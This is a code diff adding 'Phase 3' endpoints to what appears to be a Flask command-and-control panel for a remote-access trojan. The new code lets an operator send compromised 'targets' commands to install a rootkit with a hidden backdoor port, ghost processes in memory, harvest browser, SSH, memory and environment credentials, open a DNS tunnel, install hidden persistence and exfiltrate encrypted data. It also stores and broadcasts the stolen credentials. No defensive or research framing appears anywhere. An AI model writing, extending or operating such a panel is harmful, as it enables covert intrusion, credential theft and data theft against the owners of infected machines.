@@ -1097,6 +1097,302 @@ def test_native_payload():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
+# ============= PHASE 3 INTEGRATION ENDPOINTS =============
+
+@app.route('/api/target/<target_id>/action', methods=['POST'])
+@login_required
+@limiter.limit("20 per minute")
+def execute_target_action(target_id):
+    """Execute Phase 3 advanced actions on target"""
+    try:
+        metrics_collector.increment_counter('phase3_actions')
+        
+        data = request.json
+        action = data.get('action')
+        
+        # Get target connection
+        target_conn = active_connections.get(target_id)
+        if not target_conn:
+            return jsonify({'success': False, 'error': 'Target not connected'}), 404
+            
+        # Build command based on action
+        command = {
+            'id': generate_unique_id(),
+            'timestamp': datetime.utcnow().isoformat(),
+            'target_id': target_id
+        }
+        
+        if action == 'rootkit':
+            log_debug(f"Installing rootkit on {target_id}", "WARNING", "Phase3")
+            command.update({
+                'type': 'INSTALL_ROOTKIT',
+                'params': {
+                    'hide_pids': data.get('hide_pids', []),
+                    'hide_ports': data.get('hide_ports', [4433, 31337]),
+                    'hide_files': data.get('hide_files', ['stitch_*']),
+                    'backdoor_port': data.get('backdoor_port', 31337)
+                }
+            })
+            
+        elif action == 'ghost':
+            log_debug(f"Process ghosting on {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'GHOST_PROCESS',
+                'params': {
+                    'payload': data.get('payload', 'self'),
+                    'method': data.get('method', 'memfd'),  # memfd, transaction
+                    'target_process': data.get('target_process')
+                }
+            })
+            
+        elif action == 'harvest':
+            log_debug(f"Harvesting credentials on {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'HARVEST_CREDS',
+                'params': {
+                    'targets': data.get('targets', ['browser', 'ssh', 'memory', 'env']),
+                    'exfil_method': data.get('exfil_method', 'direct'),
+                    'process_targets': data.get('process_targets', [])
+                }
+            })
+            
+        elif action == 'dns_tunnel':
+            log_debug(f"Setting up DNS tunnel on {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'SETUP_DNS_TUNNEL',
+                'params': {
+                    'server': data.get('server', '8.8.8.8'),
+                    'domain': data.get('domain', 'data.example.com'),
+                    'mode': data.get('mode', 'backup'),  # primary, backup
+                    'chunk_size': data.get('chunk_size', 32)
+                }
+            })
+            
+        elif action == 'persist_all':
+            log_debug(f"Installing full persistence on {target_id}", "WARNING", "Phase3")
+            command.update({
+                'type': 'PERSIST_FULL',
+                'params': {
+                    'methods': data.get('methods', ['rootkit', 'startup', 'service', 'scheduled']),
+                    'backup_c2': data.get('backup_c2', True),
+                    'hide_artifacts': data.get('hide_artifacts', True)
+                }
+            })
+            
+        elif action == 'exfiltrate':
+            log_debug(f"Exfiltrating data from {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'EXFILTRATE',
+                'params': {
+                    'method': data.get('method', 'direct'),
+                    'target': data.get('target'),
+                    'compress': data.get('compress', True),
+                    'encrypt': data.get('encrypt', True),
+                    'chunk_delay': data.get('chunk_delay', 100)
+                }
+            })
+            
+        else:
+            return jsonify({'success': False, 'error': f'Unknown action: {action}'}), 400
+            
+        # Send command to target
+        if send_command_to_target(target_id, command):
+            # Track operation
+            operation_id = command['id']
+            active_operations[operation_id] = {
+                'target_id': target_id,
+                'action': action,
+                'status': 'pending',
+                'started': datetime.utcnow(),
+                'command': command
+            }
+            
+            # Emit WebSocket event
+            socketio.emit('operation_started', {
+                'operation_id': operation_id,
+                'target_id': target_id,
+                'action': action,
+                'timestamp': datetime.utcnow().isoformat()
+            })
+            
+            return jsonify({
+                'success': True,
+                'operation_id': operation_id,
+                'message': f'Action {action} initiated'
+            })
+        else:
+            return jsonify({'success': False, 'error': 'Failed to send command'}), 500
+            
+    except Exception as e:
+        log_debug(f"Phase3 action error: {str(e)}", "ERROR", "Phase3")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/target/<target_id>/info', methods=['GET'])
+@login_required
+def get_target_info(target_id):
+    """Get detailed target information including Phase 3 status"""
+    try:
+        target_conn = active_connections.get(target_id)
+        if not target_conn:
+            return jsonify({'success': False, 'error': 'Target not found'}), 404
+            
+        # Get stored target info
+        target_info = {
+            'id': target_id,
+            'status': 'online' if target_conn else 'offline',
+            'last_beacon': target_conn.get('last_beacon', 'Never'),
+            'ip_address': target_conn.get('ip'),
+            'hostname': target_conn.get('hostname', 'Unknown'),
+            'os': target_conn.get('os', 'Unknown'),
+            'privileges': target_conn.get('privileges', 'user'),
+            'has_rootkit': target_conn.get('has_rootkit', False),
+            'has_persistence': target_conn.get('has_persistence', False),
+            'credentials_found': target_conn.get('credentials_found', 0),
+            'processes': []
+        }
+        
+        # Get process list with injection scores
+        if target_conn.get('processes'):
+            from injection_manager import injection_manager
+            processes = injection_manager.enumerate_processes()
+            
+            # Filter and score
+            for proc in processes[:20]:  # Limit to top 20
+                proc['injection_score'] = injection_manager.calculate_injection_score(proc)
+                target_info['processes'].append({
+                    'pid': proc['pid'],
+                    'name': proc['name'],
+                    'injection_score': proc['injection_score']
+                })
+                
+        return jsonify(target_info)
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/task/<task_id>/status', methods=['GET'])
+@login_required
+def get_task_status(task_id):
+    """Get status of a Phase 3 operation"""
+    try:
+        operation = active_operations.get(task_id)
+        
+        if not operation:
+            return jsonify({'success': False, 'error': 'Operation not found'}), 404
+            
+        # Calculate duration
+        duration = (datetime.utcnow() - operation['started']).total_seconds()
+        
+        return jsonify({
+            'success': True,
+            'task_id': task_id,
+            'status': operation['status'],
+            'action': operation['action'],
+            'target_id': operation['target_id'],
+            'duration': duration,
+            'result': operation.get('result'),
+            'error': operation.get('error')
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/credentials', methods=['GET'])
+@login_required
+def get_harvested_credentials():
+    """Get all harvested credentials"""
+    try:
+        # In production, these would be stored in database
+        credentials = session.get('harvested_credentials', [])
+        
+        return jsonify({
+            'success': True,
+            'count': len(credentials),
+            'credentials': credentials
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+# Helper function to send commands to targets
+def send_command_to_target(target_id, command):
+    """Send command to connected target via WebSocket"""
+    try:
+        target_conn = active_connections.get(target_id)
+        if not target_conn:
+            return False
+            
+        # Encrypt command
+        encrypted_command = encrypt_data(json.dumps(command))
+        
+        # Send via WebSocket
+        socketio.emit('command', encrypted_command, room=target_conn.get('sid'))
+        
+        log_debug(f"Command sent to {target_id}: {command['type']}", "INFO", "Command")
+        return True
+        
+    except Exception as e:
+        log_debug(f"Failed to send command: {str(e)}", "ERROR", "Command")
+        return False
+
+# WebSocket handlers for Phase 3 operations
+@socketio.on('operation_result')
+def handle_operation_result(data):
+    """Handle results from Phase 3 operations"""
+    try:
+        operation_id = data.get('operation_id')
+        operation = active_operations.get(operation_id)
+        
+        if not operation:
+            return
+            
+        # Update operation status
+        operation['status'] = data.get('status', 'completed')
+        operation['result'] = data.get('result')
+        operation['error'] = data.get('error')
+        
+        # Special handling for different operations
+        if operation['action'] == 'harvest' and data.get('credentials'):
+            # Store harvested credentials
+            if 'harvested_credentials' not in session:
+                session['harvested_credentials'] = []
+            session['harvested_credentials'].extend(data['credentials'])
+            
+            # Update target info
+            target_id = operation['target_id']
+            if target_id in active_connections:
+                active_connections[target_id]['credentials_found'] = len(data['credentials'])
+                
+            # Broadcast credential update
+            socketio.emit('credentials_harvested', {
+                'target_id': target_id,
+                'count': len(data['credentials']),
+                'credentials': data['credentials']
+            })
+            
+        elif operation['action'] == 'rootkit' and data.get('status') == 'installed':
+            # Mark target as having rootkit
+            target_id = operation['target_id']
+            if target_id in active_connections:
+                active_connections[target_id]['has_rootkit'] = True
+                active_connections[target_id]['has_persistence'] = True
+                
+            socketio.emit('rootkit_installed', {
+                'target_id': target_id
+            })
+            
+        # Emit completion event
+        socketio.emit('operation_completed', {
+            'operation_id': operation_id,
+            'status': operation['status'],
+            'result': operation.get('result')
+        })
+        
+        log_debug(f"Operation {operation_id} completed: {operation['status']}", "INFO", "Phase3")
+        
+    except Exception as e:
+        log_debug(f"Operation result error: {str(e)}", "ERROR", "Phase3")
+
 @app.route('/api/download-payload')
 @login_required
 def download_payload():
